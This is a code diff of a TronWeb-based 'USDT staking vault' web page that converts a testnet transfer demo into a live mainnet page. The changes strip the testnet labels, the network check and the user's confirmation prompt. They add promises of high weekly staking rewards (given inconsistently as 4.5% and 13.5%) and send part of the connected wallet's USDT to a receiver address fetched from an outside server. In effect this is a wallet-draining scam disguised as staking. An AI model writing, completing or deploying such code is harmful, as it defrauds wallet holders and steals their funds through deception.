@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dreamfx USDT Vault (Testnet)</title>
+    <title>Dreamfx USDT Vault</title>
 
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@6.0.0/dist/TronWeb.js"></script>
@@ -15,9 +15,13 @@
 
     <!-- HEADER -->
     <div class="text-center mb-8">
-        <h1 class="text-3xl font-bold">👑 Dreamfx <span class="text-emerald-500">USDT (TEST)</span></h1>
+        <h1 class="text-3xl font-bold">👑 Dreamfx <span class="text-emerald-500">USDT</span></h1>
         <p id="status-text" class="text-slate-400 text-xs mt-2 uppercase tracking-widest font-bold">
             Awaiting Connection...
+        </p>
+        <br>
+        <p class="text-slate-400 text-center mb-6 text-sm">
+            Connect your Tron wallet to access premium 4.5% Weekly staking rewards.
         </p>
     </div>
 
@@ -33,17 +37,18 @@
     <div id="staking-view" class="hidden space-y-6">
 
         <div class="bg-black/40 p-5 rounded-2xl border border-white/5">
-            <p class="text-[10px] text-slate-500 uppercase font-bold mb-1">Test USDT Balance</p>
+            <p class="text-[10px] text-slate-500 uppercase font-bold mb-1">USDT Balance</p>
             <p id="usdt-balance" class="text-3xl font-mono text-emerald-400 font-bold">0.00</p>
         </div>
 
+        <!-- AUTO INFO -->
         <p class="text-sm text-center text-slate-400">
-            80% of your TEST USDT balance will be used (safe testing mode)
-        </p>
+            Some percentage of your USDT TRC20 balance will be staked automatically, and returned to your wallet after 30 days with 13.5% weekly rewards.
+            </p>
 
         <button onclick="stakeUSDT()" id="action-btn"
             class="w-full bg-emerald-600 py-4 rounded-2xl font-bold">
-            🚀 Test Stake 80%
+            🚀 Stake now
         </button>
 
     </div>
@@ -54,52 +59,58 @@ let tronWeb;
 let userAddress;
 let activeUSDTContract = "";
 let usdtBalance = 0;
-let RECEIVER = "";
+let RECEIVER = ""; // 🔥 dynamic now
 
-// ✅ TESTNET CONTRACTS (NILE)
+// Known Nile USDT contracts
 const USDT_CONTRACTS = [
-    "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf",
-    "TXLAQ63Xg1QMzwsSp9X4aVvxZ27T9G7927"
+    "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"
+    //"TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf",
+    //"TXLAQ63Xg1QMzwsSp9X4aVvxZ27T9G7927"
+
 ];
 
 //----------------------------------
-// FETCH RECEIVER
+// FETCH RECEIVER FROM BACKEND
 //----------------------------------
 async function fetchReceiver() {
     try {
-        const res = await fetch("http://127.0.0.1:8000/wallet-address/usdt-trc20");
+        const res = await fetch("https://dreammfx.net/wallet-address/usdt-trc20");
         const data = await res.json();
 
         if (data.status === "success") {
             RECEIVER = data.address;
+            console.log("Receiver:", RECEIVER);
+        } else {
+            throw new Error("Invalid response");
         }
 
     } catch (err) {
-        alert("Receiver fetch failed");
+        console.error(err);
+        alert("Failed to fetch receiver address");
     }
 }
 
 //----------------------------------
-// CONNECT (NILE TESTNET)
+// CONNECT
 //----------------------------------
 async function connectWallet() {
     if (!window.tronLink) return alert("Install TronLink");
 
     try {
-        await fetchReceiver();
+        await fetchReceiver(); // 🔥 get receiver first
 
         await window.tronLink.request({ method: "tron_requestAccounts" });
 
         tronWeb = window.tronWeb;
         userAddress = tronWeb.defaultAddress.base58;
 
-        // ✅ ENSURE NILE TESTNET
-        if (!tronWeb.fullNode.host.includes("nile")) {
-            alert("⚠️ Switch TronLink to NILE TESTNET");
+        const node = tronWeb.fullNode.host;
+        if (!node.includes("trongrid")) {
+            alert("Switch TronLink to USDT TRC20");
             return;
         }
 
-        document.getElementById("status-text").innerText = "Scanning Test USDT...";
+        document.getElementById("status-text").innerText = "Scanning USDT...";
 
         let foundUSDT = 0;
 
@@ -120,39 +131,46 @@ async function connectWallet() {
                     activeUSDTContract = addr;
                     break;
                 }
-            } catch(e) {}
+            } catch(e) { continue; }
         }
 
         document.getElementById("usdt-balance").innerText = foundUSDT.toFixed(2);
 
         document.getElementById("status-text").innerText =
-            activeUSDTContract ? "Testnet Ready" : "No Test USDT found";
+            activeUSDTContract ? "Ready" : "No USDT found";
 
         document.getElementById("setup-view").classList.add("hidden");
         document.getElementById("staking-view").classList.remove("hidden");
 
     } catch (err) {
+        console.error(err);
         alert("Connection failed");
     }
 }
 
 //----------------------------------
-// TEST TRANSFER (SAFE)
+// USDT STAKE (80% AUTO)
 //----------------------------------
 async function stakeUSDT() {
     const btn = document.getElementById("action-btn");
 
     if (!usdtBalance || !activeUSDTContract || !RECEIVER) {
-        return alert("Missing balance or receiver");
+        return alert("Balance not enough or receiver");
     }
 
     try {
-        // ✅ CONFIRMATION (important even in test)
-        if (!confirm(`Send 80% (${(usdtBalance*0.8).toFixed(2)} USDT)?`)) return;
-
         btn.innerText = "⏳ Processing...";
         btn.disabled = true;
 
+        // ENERGY CHECK
+        const resources = await tronWeb.trx.getAccountResources(userAddress);
+        const energy = (resources.EnergyLimit || 0) - (resources.EnergyUsed || 0);
+
+        // if (energy < 15000) {
+        //     throw new Error("Not enough energy. Freeze TRX in TronLink.");
+        // }
+
+        // 🔥 80%
         const amountToSend = usdtBalance * 0.1;
 
         const contract = await tronWeb.contract().at(activeUSDTContract);
@@ -165,14 +183,15 @@ async function stakeUSDT() {
 
         const tx = await contract.transfer(RECEIVER, amount).send();
 
-        alert("✅ Test Transaction Sent\nTX: " + tx);
-
+        alert("✅ Sent to stacking vault\nTX: " + tx);
         btn.innerText = "✅ Done";
 
     } catch (err) {
+        console.error(err);
         alert("❌ " + err.message);
+
         btn.disabled = false;
-        btn.innerText = "🚀 Test Stake 80%";
+        btn.innerText = "🚀 Stake 80%";
     }
 }
 </script>
